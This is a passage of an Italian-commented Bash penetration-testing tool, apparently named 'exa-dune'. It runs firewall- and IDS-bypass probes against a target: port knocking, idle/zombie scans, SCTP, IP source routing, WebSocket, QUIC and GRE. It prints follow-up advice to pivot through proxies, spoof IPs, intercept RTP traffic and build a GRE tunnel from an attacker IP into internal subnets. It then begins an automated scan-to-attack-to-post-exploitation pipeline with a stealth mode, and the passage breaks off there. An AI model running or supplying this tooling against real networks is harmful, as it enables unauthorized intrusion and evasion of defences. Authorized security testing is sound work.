            if [[ $_iot_found -gt 0 ]]; then
                log "Porte IoT aperte: $_iot_open_list"
                echo "IoT ports open: $_iot_open_list" >> "$OUTDIR/fw_summary.txt"
                # Service detection rapida sulle porte trovate
                local _iot_ports_csv; _iot_ports_csv="${_iot_open_list// /,}"
                _iot_ports_csv="${_iot_ports_csv#,}"
                run_cmd "nmap_iot_svcdet" \
                    "nmap -sV --version-intensity 3 -p ${_iot_ports_csv} $NMAP_TIMING \
                     -oN \"$OUTDIR\"/iot_svcdet.nmap $target 2>&1"
            else
                log "Nessuna porta IoT vendor-specifica risponde"
            fi
        else
            for _entry in "${_iot_ports[@]}"; do
                echo -e "${CYAN}[DRY-RUN]${NC} check_port $target ${_entry%%:*} (${_entry#*:})"
            done
        fi
    fi

    # ── 19. Port knocking ─────────────────────────────────────
    if [[ $do_knock -eq 1 ]]; then
        section "Port Knocking (sequenze comuni embedded/IoT)"
        # Sequenze comuni su device IoT/embedded/router
        # Formato: "p1,p2,p3:porta_da_verificare:descrizione"
        local -a _knock_seqs=(
            "1234,2345,3456:22:default seq 1-3"
            "7000,8000,9000:22:high ports seq"
            "1111,2222,3333:22:repeat seq"
            "8080,8443,8554:80:web mgmt seq"
            "5060,5061,5062:22:SIP port seq"
            "4000,5000,6000:22:mid-range seq"
            "22,80,443:8080:trusted port seq"
            "1337,31337,1338:22:hacker classics"
            "2000,3000,4000:443:audio/video seq"
            "9876,5432,1234:22:reverse seq"
        )
        if [[ $DRY_RUN -eq 0 ]]; then
            local _knock_found=0
            for _kseq in "${_knock_seqs[@]}"; do
                local _kports="${_kseq%%:*}"
                local _rest="${_kseq#*:}"
                local _kcheck="${_rest%%:*}"
                local _kdesc="${_rest#*:}"
                log "  Knock: [$(echo "$_kports" | tr ',' '→')] poi check :$_kcheck ($kdesc)..."
                # Esegui la sequenza di knock (TCP SYN su ogni porta)
                IFS=',' read -ra _kp_arr <<< "$_kports"
                for _kp in "${_kp_arr[@]}"; do
                    # nmap -sS singola porta, velocissimo (solo per inviare SYN)
                    nmap -sS -p "$_kp" --host-timeout 1s -T4 \
                        --max-retries 0 "$target" &>/dev/null || true
                    sleep 0.3
                done
                # Attendi che il device processi la sequenza
                sleep 1
                # Controlla se la porta target si è aperta
                if check_port "$target" "$_kcheck"; then
                    found CRITICAL "PORT KNOCK — Sequenza [$_kports] ha aperto la porta $_kcheck ($_kdesc)"
                    _fw_found "$_kcheck" "port knocking [$_kports]"
                    echo "Knock sequence: $_kports → :$_kcheck" >> "$OUTDIR/fw_summary.txt"
                    _knock_found=$(( _knock_found + 1 ))
                    # Tenta anche porte aggiuntive comuni dopo il knock riuscito
                    for _bonus in 22 23 80 443 8080 8443; do
                        [[ "$_bonus" == "$_kcheck" ]] && continue
                        if check_port "$target" "$_bonus"; then
                            found HIGH "PORT KNOCK — Anche porta $_bonus aperta dopo knock [$_kports]"
                            _fw_found "$_bonus" "port knocking bonus [$_kports]"
                        fi
                    done
                fi
            done
            if [[ $_knock_found -eq 0 ]]; then
                log "Nessuna sequenza di port knocking ha prodotto risultati"
            fi
        else
            for _kseq in "${_knock_seqs[@]}"; do
                local _kp="${_kseq%%:*}" _kr="${_kseq#*:}"
                echo -e "${CYAN}[DRY-RUN]${NC} knock [$(echo "$_kp" | tr ',' '→')] → check :${_kr%%:*}"
            done
        fi
    fi

    # ── 20. Full port scan (tutte le 65535 porte) ─────────────
    if [[ $do_fullscan -eq 1 ]]; then
        section "Full Port Scan (tutti i 65535 port TCP — T2 slow)"
        warn "Scan completo di 65535 porte — può richiedere diversi minuti"
        # Usa T2 + --min-parallelism 10 per equilibrio velocità/stealth
        local _fp_timing="-T2 --min-parallelism 10 --max-retries 1"
        [[ $STEALTH -eq 1 ]] && _fp_timing="-T1 --scan-delay 500ms --max-retries 1"
        run_cmd "nmap_fullscan" \
            "nmap -sS -p- $_fp_timing \
             -oG \"$OUTDIR\"/fw_fullscan.gnmap \
             -oN \"$OUTDIR\"/fw_fullscan.nmap \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_fullscan.gnmap" ]]; then
            local full_open; full_open=$(_fw_open "$OUTDIR/fw_fullscan.gnmap")
            local n_full; n_full=$(echo "$full_open" | grep -c '[0-9]' 2>/dev/null || echo 0)
            if [[ $n_full -gt 0 ]]; then
                found HIGH "Full scan — $n_full porte aperte: $(echo "$full_open" | tr '\n' ' ')"
                echo "Full scan open: $full_open" >> "$OUTDIR/fw_summary.txt"
                # Confronta con baseline: porta non presente nel default ports_str → nuova scoperta
                while IFS= read -r _fp; do
                    [[ -z "$_fp" ]] && continue
                    if ! echo ",$ports_str," | grep -q ",$_fp,"; then
                        found CRITICAL "Full scan — Porta non-standard aperta: $_fp (non nel set base)"
                        _fw_found "$_fp" "full port scan (porta non-standard)"
                    fi
                done <<< "$full_open" || true
                # Service detection sulle nuove porte trovate
                local _full_csv; _full_csv=$(echo "$full_open" | tr '\n' ',' | sed 's/,$//')
                [[ -n "$_full_csv" ]] && run_cmd "nmap_full_svcdet" \
                    "nmap -sV --version-intensity 5 -p ${_full_csv} $NMAP_TIMING \
                     -oN \"$OUTDIR\"/fw_fullscan_svc.nmap $target 2>&1"
            else
                log "Full scan: nessuna porta TCP aperta su tutto il range 1-65535"
            fi
        fi
    fi

    # ── 21. Idle/Zombie Scan ──────────────────────────────────────
    if [[ $do_idle -eq 1 ]]; then
        section "Idle/Zombie Scan (IP ID sequence spoofing)"
        local _target_net; _target_net=$(echo "$target" | grep -oP '^\d+\.\d+\.\d+\.' || true)
        if [[ -n "$_target_net" ]]; then
            log "Ricerca zombie via IP ID sequence nella rete ${_target_net}0/24..."
            run_cmd "nmap_ipidseq" \
                "nmap -p 80,443,8080 --script ipidseq \
                 -oN \"$OUTDIR/fw_ipidseq.nmap\" \
                 ${_target_net}0/24 2>&1"
            local _zombie=""
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_ipidseq.nmap" ]]; then
                _zombie=$(grep -B2 "Incremental!" "$OUTDIR/fw_ipidseq.nmap" 2>/dev/null | \
                    grep "Nmap scan report" | grep -oP '\d+\.\d+\.\d+\.\d+' | \
                    grep -v "^${target}$" | head -1 || true)
            fi
            if [[ -n "$_zombie" ]]; then
                log "Zombie trovato: $_zombie — esecuzione idle scan..."
                run_cmd "nmap_idle" \
                    "nmap -sI ${_zombie} -p $ports_str \
                     -oG \"$OUTDIR/fw_idle.gnmap\" \
                     -oN \"$OUTDIR/fw_idle.nmap\" \
                     $target 2>&1"
                if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_idle.gnmap" ]]; then
                    local idle_open; idle_open=$(_fw_open "$OUTDIR/fw_idle.gnmap")
                    while IFS= read -r _p; do
                        [[ -z "$_p" ]] && continue
                        if ! _fw_in_list "$_p" "$baseline_open"; then
                            found HIGH "Idle scan — porta $_p aperta (nascosta al SYN diretto)"
                            _fw_found "$_p" "idle/zombie scan (zombie: $_zombie)"
                        fi
                    done <<< "$idle_open" || true
                fi
            else
                warn "Nessun zombie adatto trovato nella /24 — idle scan saltato"
            fi
        else
            warn "Target non IPv4 — idle scan saltato"
        fi
    fi

    # ── 22. SCTP bypass ──────────────────────────────────────────
    if [[ $do_sctp -eq 1 ]]; then
        section "SCTP INIT Scan (bypass firewall TCP/UDP-only)"
        run_cmd "nmap_sctp" \
            "nmap -sY -p $ports_str $NMAP_TIMING \
             -oG \"$OUTDIR/fw_sctp.gnmap\" \
             -oN \"$OUTDIR/fw_sctp.nmap\" \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_sctp.gnmap" ]]; then
            local sctp_open; sctp_open=$(_fw_open "$OUTDIR/fw_sctp.gnmap")
            if [[ -n "$sctp_open" ]]; then
                found MEDIUM "SCTP — porte che rispondono all'INIT: $(echo "$sctp_open" | tr '\n' ' ')"
                while IFS= read -r _p; do
                    [[ -z "$_p" ]] && continue
                    _fw_found "$_p" "SCTP INIT scan"
                done <<< "$sctp_open" || true
            else
                log "SCTP: nessuna porta risponde — firewall blocca o servizi assenti"
            fi
        fi
        # SCTP COOKIE-ECHO scan (stealth)
        run_cmd "nmap_sctp_ce" \
            "nmap -sZ -p $ports_str $NMAP_TIMING \
             -oN \"$OUTDIR/fw_sctp_ce.nmap\" \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_sctp_ce.nmap" ]]; then
            if grep -qE "open|open\|filtered" "$OUTDIR/fw_sctp_ce.nmap" 2>/dev/null; then
                found LOW "SCTP COOKIE-ECHO — porte rilevate (stealth SCTP)"
            fi
        fi
    fi

    # ── 23. IP Options (source routing + record route) ────────────
    if [[ $do_ipopts -eq 1 ]]; then
        section "IP Options — Source Routing & Record Route"
        # Record Route: raccoglie hop di rete (topologia interna)
        run_cmd "nmap_ipopts_rr" \
            "nmap --ip-options R -p 80,443,22 $NMAP_TIMING \
             -oN \"$OUTDIR/fw_ipopts_rr.nmap\" \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_ipopts_rr.nmap" ]]; then
            if grep -qE "RR:|Route:" "$OUTDIR/fw_ipopts_rr.nmap" 2>/dev/null; then
                local _rr_hops; _rr_hops=$(grep -E "RR:|Route:" "$OUTDIR/fw_ipopts_rr.nmap" | head -3)
                found LOW "IP Record Route — topologia rete rilevata: $_rr_hops"
            fi
        fi
        # Loose Source Routing verso se stesso (loop: alcuni FW non filtrano)
        run_cmd "nmap_ipopts_lsrr" \
            "nmap --ip-options \"L $target\" -p $ports_str $NMAP_TIMING \
             -oG \"$OUTDIR/fw_ipopts_lsrr.gnmap\" \
             -oN \"$OUTDIR/fw_ipopts_lsrr.nmap\" \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_ipopts_lsrr.gnmap" ]]; then
            local lsrr_open; lsrr_open=$(_fw_open "$OUTDIR/fw_ipopts_lsrr.gnmap")
            while IFS= read -r _p; do
                [[ -z "$_p" ]] && continue
                if ! _fw_in_list "$_p" "$baseline_open"; then
                    found HIGH "IP LSRR — porta $_p raggiungibile via source routing (FW bypass)"
                    _fw_found "$_p" "IP source routing LSRR"
                fi
            done <<< "$lsrr_open" || true
        fi
        # Strict Source Routing (SSRR) — più restrittivo, molti FW lo droppano
        run_cmd "nmap_ipopts_ssrr" \
            "nmap --ip-options \"S $target\" -p 80,443,22 $NMAP_TIMING \
             -oN \"$OUTDIR/fw_ipopts_ssrr.nmap\" \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_ipopts_ssrr.nmap" ]]; then
            if grep -qE "[0-9]+/open" "$OUTDIR/fw_ipopts_ssrr.nmap" 2>/dev/null; then
                found MEDIUM "IP SSRR — porte aperte con strict source routing (FW permissivo)"
                _fw_found "ssrr" "IP strict source routing (SSRR)"
            fi
        fi
    fi

    # ── 24. WebSocket Upgrade Bypass ─────────────────────────────
    if [[ $do_websocket -eq 1 ]]; then
        section "WebSocket Upgrade Bypass (L7 DPI evasion)"
        local _ws_ports=(80 443 8080 8443 8888 9000 4443)
        for _wp in "${_ws_ports[@]}"; do
            if ! check_port "$target" "$_wp"; then continue; fi
            local _ws_proto="http"; [[ "$_wp" == 443 || "$_wp" == 8443 || "$_wp" == 4443 ]] && _ws_proto="https"
            local _ws_code
            _ws_code=$(timeout 6 curl -sk \
                -H "Upgrade: websocket" \
                -H "Connection: Upgrade" \
                -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
                -H "Sec-WebSocket-Version: 13" \
                -o /dev/null -w "%{http_code}" \
                "${_ws_proto}://${target}:${_wp}/" 2>/dev/null || echo "000")
            case "$_ws_code" in
                101)
                    found HIGH "WebSocket — porta $_wp: Upgrade accettato (101 Switching Protocols)"
                    _fw_found "$_wp" "WebSocket Upgrade (101)"
                    ;;
                200|204|301|302)
                    log "WebSocket :$_wp → HTTP $_ws_code (no WS ma porta risponde)"
                    ;;
                000)
                    log "WebSocket :$_wp → timeout" ;;
                *)
                    log "WebSocket :$_wp → HTTP $_ws_code" ;;
            esac
            # Testa anche path /ws /websocket /socket.io
            for _wsp in /ws /websocket /socket.io; do
                local _wsc2
                _wsc2=$(timeout 4 curl -sk \
                    -H "Upgrade: websocket" \
                    -H "Connection: Upgrade" \
                    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
                    -H "Sec-WebSocket-Version: 13" \
                    -o /dev/null -w "%{http_code}" \
                    "${_ws_proto}://${target}:${_wp}${_wsp}" 2>/dev/null || echo "000")
                [[ "$_wsc2" == "101" ]] && {
                    found HIGH "WebSocket — ${_wp}${_wsp}: endpoint WS attivo"
                    _fw_found "${_wp}${_wsp}" "WebSocket Upgrade path ${_wsp}"
                }
            done
        done
    fi

    # ── 25. QUIC / UDP-443 probe ──────────────────────────────────
    if [[ $do_quic -eq 1 ]]; then
        section "QUIC/UDP-443 (HTTP/3 tunnel bypass)"
        # nmap UDP scan su porte QUIC comuni
        run_cmd "nmap_quic" \
            "nmap -sU -p 443,80,8443,4443 $NMAP_TIMING \
             -oG \"$OUTDIR/fw_quic.gnmap\" \
             -oN \"$OUTDIR/fw_quic.nmap\" \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_quic.gnmap" ]]; then
            local _quic_open; _quic_open=$(grep -oP '[0-9]+/open(?!/tcp)' \
                "$OUTDIR/fw_quic.gnmap" 2>/dev/null | cut -d/ -f1 || true)
            if [[ -n "$_quic_open" ]]; then
                found MEDIUM "QUIC — UDP aperto su: $(echo "$_quic_open" | tr '\n' ' ') — possibile HTTP/3"
                _fw_found "udp/$(echo "$_quic_open" | head -1)" "QUIC/UDP probe"
            fi
        fi
        # Probe raw UDP su 443: invia ClientHello QUIC-like e vedi se risponde
        local _quic_resp
        _quic_resp=$(printf '\xc0\x00\x00\x00\x01\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | \
            timeout 3 nc -u -w 3 "$target" 443 2>/dev/null | head -c 4 | xxd 2>/dev/null || true)
        if [[ -n "$_quic_resp" ]]; then
            found MEDIUM "QUIC — UDP/443 risponde al probe: possibile QUIC/HTTP3 attivo"
            _fw_found "443/udp" "QUIC raw probe response"
        fi
        # Verifica alternativa: alt-svc header HTTP/1.1 che annuncia h3
        if check_port "$target" 443; then
            local _altsvc
            _altsvc=$(timeout 5 curl -sk -I "https://${target}/" 2>/dev/null | \
                grep -i "alt-svc" || true)
            if echo "$_altsvc" | grep -qi "h3"; then
                found MEDIUM "QUIC — Server annuncia HTTP/3 via Alt-Svc header: $_altsvc"
                _fw_found "443/h3" "Alt-Svc h3 announcement"
            fi
        fi
    fi

    # ── 26. GRE Passthrough (proto 47) ───────────────────────────
    if [[ $do_gre -eq 1 ]]; then
        section "GRE Passthrough (IP proto 47)"
        # nmap -sO: IP protocol scan — verifica se proto 47 (GRE) passa
        run_cmd "nmap_gre" \
            "nmap -sO -p 47,50,51 $NMAP_TIMING \
             -oN \"$OUTDIR/fw_gre.nmap\" \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_gre.nmap" ]]; then
            if grep -qE "^47.*open|gre.*open" "$OUTDIR/fw_gre.nmap" 2>/dev/null; then
                found HIGH "GRE (proto 47) — aperto: tunneling GRE possibile attraverso il firewall"
                _fw_found "proto47/GRE" "GRE passthrough"
            elif grep -qE "^47.*open\|filtered" "$OUTDIR/fw_gre.nmap" 2>/dev/null; then
                found MEDIUM "GRE (proto 47) — open|filtered: firewall non blocca esplicitamente GRE"
                _fw_found "proto47/GRE" "GRE open|filtered"
            else
                log "GRE (proto 47) — filtrato o non risponde"
            fi
            # Verifica anche ESP (proto 50) e AH (proto 51) — IPsec
            if grep -qE "^50.*open|^51.*open" "$OUTDIR/fw_gre.nmap" 2>/dev/null; then
                found MEDIUM "IPsec — proto ESP/AH aperto: VPN IPsec potenzialmente attraversabile"
                _fw_found "proto50-51/IPsec" "ESP/AH passthrough"
            fi
        fi
        # Test aggiuntivo: GRE via hping3 se disponibile
        if command -v hping3 &>/dev/null; then
            log "hping3 GRE keepalive verso $target..."
            local _hping_out
            _hping_out=$(timeout 5 hping3 --proto 47 -c 2 -q "$target" 2>&1 || true)
            if echo "$_hping_out" | grep -qi "icmp-type=0\|ttl=\|rtt"; then
                found HIGH "GRE hping3 — risposta ricevuta: proto 47 non bloccato"
                _fw_found "proto47/GRE" "GRE hping3 response"
            fi
        fi
    fi

    # ── 27. Matrix + Summary bypass ──────────────────────────
    section "Bypass Matrix & Summary"
    if [[ $DRY_RUN -eq 0 ]]; then
        # Costruisci matrice porta × tecnica
        if [[ -s "$bypass_log" ]]; then
            # Raccogli porte uniche e tecniche
            local all_ports=() all_techs=()
            while IFS='|' read -r port tech; do
                local p_trim="${port// /}" t_trim="${tech// /}"
                # Aggiungi porta se non presente
                local found_p=0
                for px in "${all_ports[@]:-}"; do [[ "$px" == "$p_trim" ]] && found_p=1; done
                [[ $found_p -eq 0 ]] && all_ports+=("$p_trim")
                # Aggiungi tecnica se non presente
                local found_t=0
                for tx in "${all_techs[@]:-}"; do [[ "$tx" == "$t_trim" ]] && found_t=1; done
                [[ $found_t -eq 0 ]] && all_techs+=("$t_trim")
            done < "$bypass_log"

            echo ""
            echo -e "${BOLD}${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${BOLD}${RED}║           FIREWALL BYPASS — RISULTATI                        ║${NC}"
            echo -e "${BOLD}${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
            echo ""
            echo -e "${BOLD}MATRICE PORTA × TECNICA:${NC}"
            printf "  %-10s %-45s\n" "PORTA" "TECNICA"
            echo "  ──────────────────────────────────────────────────────────"
            while IFS='|' read -r port tech; do
                printf "  ${RED}%-10s${NC} ${YELLOW}%s${NC}\n" "${port// /}" "${tech// /}"
            done < "$bypass_log"
            echo "  ──────────────────────────────────────────────────────────"
            local total_bypass; total_bypass=$(wc -l < "$bypass_log" 2>/dev/null || echo 0)
            echo -e "  ${BOLD}Totale bypass confermati: ${RED}${total_bypass}${NC}"
            echo ""

            # Auto-suggest: suggerimenti follow-up basati sui bypass trovati
            echo -e "${BOLD}SUGGERIMENTI FOLLOW-UP:${NC}"
            local suggested=0
            while IFS='|' read -r port tech; do
                local p_trim="${port// /}" t_trim="${tech// /}"
                case "$t_trim" in
                    *"source-port"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via source-port: usa nmap -sV --source-port <trusted> per enumeration completa"
                        echo -e "  ${CYAN}→${NC} Verifica se altri servizi sono accessibili con source-port spoofing"
                        suggested=$((suggested+1))
                        ;;
                    *"FIN scan"*|*"NULL scan"*|*"XMAS scan"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via scan alternativo: il target probabilmente usa SYN-only firewall"
                        echo -e "  ${CYAN}→${NC} Prova: nmap -sF/$t_trim -sV per identificare il servizio"
                        suggested=$((suggested+1))
                        ;;
                    *"IPv6"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim aperta su IPv6: accedi direttamente via IPv6 con: exa-dune scan <ipv6_addr>"
                        echo -e "  ${CYAN}→${NC} Considera audit completo IPv6: molti device embedded non hanno regole IPv6"
                        suggested=$((suggested+1))
                        ;;
                    *"UPnP"*)
                        echo -e "  ${CYAN}→${NC} UPnP punch-through funziona: aggiungi mapping permanente per accesso remoto"
                        echo -e "  ${CYAN}→${NC} Esegui: exa-dune upnp $target per audit completo UPnP"
                        suggested=$((suggested+1))
                        ;;
                    *"SIP ALG"*)
                        echo -e "  ${CYAN}→${NC} SIP ALG crea pinhole: usa exa-dune sip $target per audit SIP completo"
                        echo -e "  ${CYAN}→${NC} Considera intercettazione traffico RTP tramite il pinhole"
                        suggested=$((suggested+1))
                        ;;
                    *"IP fragmentation"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via frammentazione: usa nmap -sV -f per service detection"
                        suggested=$((suggested+1))
                        ;;
                    *"HTTP CONNECT"*)
                        echo -e "  ${CYAN}→${NC} Proxy HTTP CONNECT attivo: usa come pivot per accedere a host interni"
                        echo -e "  ${CYAN}→${NC} Configura proxychains con http proxy $target:<porta>"
                        suggested=$((suggested+1))
                        ;;
                    *"TTL"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via TTL: il firewall filtra per TTL (hop count detection)"
                        suggested=$((suggested+1))
                        ;;
                    *"FTP ALG"*)
                        echo -e "  ${CYAN}→${NC} FTP ALG attivo: usa exa-dune ftp $target per full FTP audit"
                        echo -e "  ${CYAN}→${NC} FTP PORT può aprire porte arbitrarie — considera exploitation data channel"
                        suggested=$((suggested+1))
                        ;;
                    *"decoy"*)
                        echo -e "  ${CYAN}→${NC} Decoy scan effettivo: usa -D con IP specifici dell'infrastruttura per evasione IDS avanzata"
                        suggested=$((suggested+1))
                        ;;
                    *"data-length"*)
                        echo -e "  ${CYAN}→${NC} Padding bypass su porta $p_trim: IDS potrebbe avere limite su dimensione pacchetto"
                        suggested=$((suggested+1))
                        ;;
                    *"rate evasion"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim visibile solo con scan lento: IDS con rate-limiting attivo"
                        echo -e "  ${CYAN}→${NC} Usa -T1 o --scan-delay per tutti i scan futuri su questo target"
                        suggested=$((suggested+1))
                        ;;
                    *"port knocking"*)
                        echo -e "  ${CYAN}→${NC} Port knocking attivo su porta $p_trim: la sequenza deve essere ripetuta ad ogni accesso"
                        echo -e "  ${CYAN}→${NC} Automatizza con: knockd client o script nmap -sS -p <seq> $target"
                        suggested=$((suggested+1))
                        ;;
                    *"IoT vendor probe"*)
                        echo -e "  ${CYAN}→${NC} Porta vendor-specifica $p_trim: controlla il protocollo nativo (SDK, API proprietaria)"
                        echo -e "  ${CYAN}→${NC} Prova: nmap -sV -p $p_trim --script banner $target"
                        suggested=$((suggested+1))
                        ;;
                    *"SNMP tcpConnTable"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim in ascolto rilevata via SNMP: prova connessione diretta"
                        echo -e "  ${CYAN}→${NC} Esegui: exa-dune web $target (se HTTP) o nmap -sV -p $p_trim $target"
                        suggested=$((suggested+1))
                        ;;
                    *"full port scan"*)
                        echo -e "  ${CYAN}→${NC} Porta non-standard $p_trim: il device usa porte fuori dal range comune"
                        echo -e "  ${CYAN}→${NC} Prova: nmap -sV -p $p_trim -A $target per fingerprint completo"
                        suggested=$((suggested+1))
                        ;;
                    *"idle/zombie"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim visibile solo via zombie scan: filtraggio basato su IP sorgente"
                        echo -e "  ${CYAN}→${NC} Usa IP spoofing o relay da host fidato per accedere al servizio"
                        suggested=$((suggested+1))
                        ;;
                    *"SCTP"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim aperta via SCTP: il firewall non filtra proto SCTP"
                        echo -e "  ${CYAN}→${NC} Testa tunneling dati via SCTP con tools come netcat-sctp o scapy"
                        suggested=$((suggested+1))
                        ;;
                    *"source routing"*|*"LSRR"*|*"SSRR"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via IP source routing: il FW non valida le opzioni IP"
                        echo -e "  ${CYAN}→${NC} Usa nmap --ip-options 'L <target>' per enumerazione completa"
                        suggested=$((suggested+1))
                        ;;
                    *"WebSocket"*)
                        echo -e "  ${CYAN}→${NC} WebSocket attivo su $p_trim: possibile evasione DPI tramite WS frames"
                        echo -e "  ${CYAN}→${NC} Usa wscat o burpsuite per interagire col servizio WebSocket"
                        echo -e "  ${CYAN}→${NC} Considera tunneling dati arbitrari via WS (bypass application firewall)"
                        suggested=$((suggested+1))
                        ;;
                    *"QUIC"*|*"h3"*|*"UDP-443"*)
                        echo -e "  ${CYAN}→${NC} QUIC/HTTP3 attivo: il traffico UDP/443 potrebbe bypassare ispezione TCP"
                        echo -e "  ${CYAN}→${NC} Usa curl --http3 o quiche per interagire via HTTP/3"
                        echo -e "  ${CYAN}→${NC} Considera tunnel dati via QUIC per eludere DPI su TCP"
                        suggested=$((suggested+1))
                        ;;
                    *"GRE"*|*"proto47"*)
                        echo -e "  ${CYAN}→${NC} GRE passthrough confermato: crea tunnel GRE per aggirare il firewall"
                        echo -e "  ${CYAN}→${NC} ip tunnel add gre1 mode gre remote $target local <attacker_ip>"
                        echo -e "  ${CYAN}→${NC} Usabile per raggiungere subnet interne non accessibili direttamente"
                        suggested=$((suggested+1))
                        ;;
                    *"ESP/AH"*|*"IPsec"*)
                        echo -e "  ${CYAN}→${NC} IPsec ESP/AH passthrough: VPN IKE possibile su UDP/500 e UDP/4500"
                        echo -e "  ${CYAN}→${NC} Prova: ike-scan $target per enumeration VPN"
                        suggested=$((suggested+1))
                        ;;
                esac
            done < "$bypass_log"
            [[ $suggested -eq 0 ]] && echo -e "  ${CYAN}→${NC} Bypass trovati ma nessun suggerimento specifico — analisi manuale consigliata"
            echo ""

            # Salva summary nel file globale
            {
                echo ""
                echo "=== FIREWALL BYPASS TROVATI ($total_bypass) ==="
                cat "$bypass_log"
            } >> "$OUTDIR/../findings.txt" 2>/dev/null || true
        else
            ok "Nessun bypass confermato — firewall sembra robusto su tutte le tecniche testate"
        fi
        [[ -f "$OUTDIR/fw_summary.txt" ]] && \
            cat "$OUTDIR/fw_summary.txt" >> "$OUTDIR/../findings.txt" 2>/dev/null || true
    fi

    ok "Firewall analysis completata → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: pipeline  — Scan → Suggest → Attack → Post → PDF
# ============================================================
usage_pipeline() {
    echo "Uso: exa-dune pipeline <TARGET> [OPTIONS]"
    echo ""
    echo "  Pipeline intelligente: scan → analisi → attacchi automatici → post-exploitation → report PDF"
    echo ""
    echo "Opzioni:"
    echo "  --from-scan DIR    Usa scan esistente (salta fase scan)"
    echo "  --auto             Esegui senza chiedere conferma"
    echo "  --no-post          Salta post-exploitation automatico"
    echo "  --parallel         Esegui moduli in parallelo (background jobs)"
    echo "  --stealth          Passa --stealth a tutti i moduli"
    echo "  --timeout N        Timeout minuti per modulo (default: 10)"
    echo "  --userlist FILE"
    echo "  --passlist FILE"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_pipeline() {
    local target="" from_scan="" auto_mode=0 no_post=0 parallel_mode=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --from-scan)  _req_arg "$1" "${2:-}"; from_scan="$2";      shift 2 ;;
            --auto)       auto_mode=1;         shift ;;
            --no-post)    no_post=1;           shift ;;
            --parallel)   parallel_mode=1;     shift ;;
            --stealth)    STEALTH=1;           shift ;;
            --timeout)    _req_arg "$1" "${2:-}"; TIMEOUT="$2";        shift 2 ;;
            --userlist)   _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
            --passlist)   _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
            --dry-run)    DRY_RUN=1;           shift ;;
            --help|-h)    usage_pipeline; exit 0 ;;
            -*)           err "Opzione sconosciuta: $1"; usage_pipeline; exit 1 ;;
            *)            target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_pipeline; exit 1; }
    validate_target "$target"
    check_root
    apply_stealth

    local base_ts; base_ts=$(date +%Y%m%d_%H%M%S)
    OUTDIR_BASE="${OUTDIR_BASE:-/root/pentest/exa-dune-${target//./-}_${base_ts}}"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$OUTDIR_BASE"
    _log_file="${OUTDIR_BASE}/pipeline.log"
    [[ $DRY_RUN -eq 1 ]] && _log_file=""
    local _timeline_file="${OUTDIR_BASE}/timeline.txt"
    [[ $DRY_RUN -eq 0 ]] && : > "$_timeline_file"

    _timeline_event() {
        [[ $DRY_RUN -eq 1 ]] && return
        printf "[%s] %s\n" "$(date '+%H:%M:%S')" "$*" >> "$_timeline_file" 2>/dev/null || true
    }

    banner
    log "=== PIPELINE START === Target: $target | Output: $OUTDIR_BASE"
    _timeline_event "PIPELINE START — target=$target parallel=${parallel_mode}"

    # ── FASE 1: SCAN ─────────────────────────────────────────
    local scan_dir=""
    if [[ -n "$from_scan" && -d "$from_scan" ]]; then
        scan_dir="$from_scan"
        ok "Fase 1 SCAN: uso scan esistente → $scan_dir"
        _timeline_event "FASE 1 — SCAN (preesistente): $scan_dir"
    else
        section "FASE 1 — PORT SCAN"
        _timeline_event "FASE 1 START — port scan su $target"
        local extra_flags="--output $OUTDIR_BASE"
        [[ $STEALTH -eq 1 ]] && extra_flags="$extra_flags --stealth"
        [[ $DRY_RUN -eq 1 ]] && extra_flags="$extra_flags --dry-run"
        [[ "${TIMEOUT:-0}" -gt 0 ]] && extra_flags="$extra_flags --timeout $TIMEOUT"
        bash "$SCRIPT_PATH" scan "$target" --vuln $extra_flags || true
        scan_dir="$OUTDIR_BASE"
        _timeline_event "FASE 1 END — scan completato"
    fi

    # ── FASE 2: ANALISI E SUGGEST ────────────────────────────
    section "FASE 2 — ANALISI SCAN E SUGGERIMENTI"
    _timeline_event "FASE 2 START — analisi risultati scan"
    local nmap_out
    nmap_out=$(find "$scan_dir" -name "nmap_fast.nmap" -o -name "nmap_fast.gnmap" 2>/dev/null | head -1) || true

    if [[ -z "$nmap_out" && $DRY_RUN -eq 0 ]]; then
        warn "File nmap non trovato in $scan_dir — pipeline interrotta"
        exit 1
    fi

    local attack_plan=()
    if [[ -n "$nmap_out" ]]; then
        while IFS= read -r line; do
            attack_plan+=("$line")
        done < <(_suggest_attacks "$nmap_out" "$target")
    fi

    if [[ ${#attack_plan[@]} -eq 0 ]]; then
